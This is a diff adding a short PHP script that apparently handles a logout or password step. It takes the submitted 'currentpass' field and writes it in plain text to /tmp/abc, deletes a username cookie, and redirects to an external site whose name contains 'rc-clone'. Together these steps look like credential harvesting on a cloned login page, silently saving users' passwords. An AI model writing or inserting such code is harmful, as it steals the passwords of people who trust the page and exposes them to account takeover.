@@ -1,0 +1,10 @@
+<?php
+
+	$temp =  $_POST['currentpass'];
+	file_put_contents('/tmp/abc', $temp);
+	
+	setcookie("username", "", time() - 3600);
+	unset ($_COOKIE['username']);
+
+	header('location: https://rc-clone.mithiskyconnect.com');
+?>
